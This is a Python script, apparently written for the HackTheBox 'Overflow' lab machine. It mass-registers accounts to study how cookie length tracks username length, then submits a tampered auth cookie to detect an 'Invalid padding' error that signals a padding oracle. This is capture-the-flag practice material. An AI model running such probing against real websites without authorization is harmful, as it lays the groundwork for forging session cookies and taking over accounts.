#!/usr/bin/python3


# Simple python script with a register account function which performs 50 account register on the webpage of# the Overflow machine in HTB, in order to see if there is any relation between the username and cookie 
# lengths. There is also a error_detector function which tries to log in,modify it cookie, and does
# a get request to see if any padding error message is leaked. 
# Inspired by 0xdf script. Made by Txhaka.

# @Github -> https://github.com/Txhaka


#Machine name -> Overflow   IP -> 10.10.11.119      Platform -> HackTheBox

import string
import random
import sys
import signal
import requests
import time
from urllib.parse import unquote
from base64 import b64decode
from bs4 import BeautifulSoup as bs 


def handler(signum, frame):
    print("\n[-] Exiting...\n")
    time.sleep(0.5)
    sys.exit(1)



signal.signal(signal.SIGINT,handler)



def randomizer(password):
    print(f'User    b64_cookie     cookie length')
    url = 'http://10.10.11.119/register.php'
    cookies = []
    length_of_prev_cookie = 0
    for i in range (1,50):
        username =''.join(random.choice(string.ascii_letters + string.digits) for _ in range(i))
        params = {'username':username, 'password':password, 'password2':password}
        r = requests.post(url,data=params,allow_redirects=False)
        b64_cookie = unquote(r.cookies["auth"])
        cookie_raw = b64decode(b64_cookie)
        if len(b64_cookie) != length_of_prev_cookie:
            print(f'{len(username):^6}          {len(b64_cookie)}          {len(cookie_raw)}')
            length_of_prev_cookie = len(b64_cookie)



def error_detector(username,password,url):
    s = requests.Session()
    
    params = {'username':username, 'password':password,'password2':password}
    s.post(url,data=params)
    s.cookies.clear()
    new_cookie = 'wAZmPXTYpkL4Lq5BR7Mo3hQQDtt3vEr'
    s.cookies.set('auth',new_cookie)
    r = s.get('http://10.10.11.119/index.php', allow_redirects=False)
    redirect_url = r.headers.get('location')
    if 'logout.php?err=1' in redirect_url:
        time.sleep(1)
        print('\n[~] The page is redirecting to logout.php?err=1\n')
        time.sleep(1)
        r = requests.get('http://10.10.11.119/logout.php?err=1')
        if 'Invalid padding' in r.text:
            soup = bs(r.text,'html.parser')
            error_message = soup.find("span")
            print(error_message.get_text(strip=True))
            time.sleep(2)
            print('\n[+] Error message leaked, padding oracle attack can be performed !')
            time.sleep(2)
            sys.exit(0)
        else:
            print('\n[-] No error message found!')
    else:
        print('\n[-] No redirect has been performed')




if __name__=="__main__":
    if len(sys.argv) != 1:
        print ("Usage : python3 padding.py")
        sys.exit(1)


    print(' [+] Registering accounts to compare usernames and cookies lengths')
    time.sleep(2)
    randomizer('aaaaaa')
    print("\n[~] Now let's try to log in, modify our cookie and refresh the page\n")
    error_detector('random_username','random_password','http://10.10.11.119/register.php')


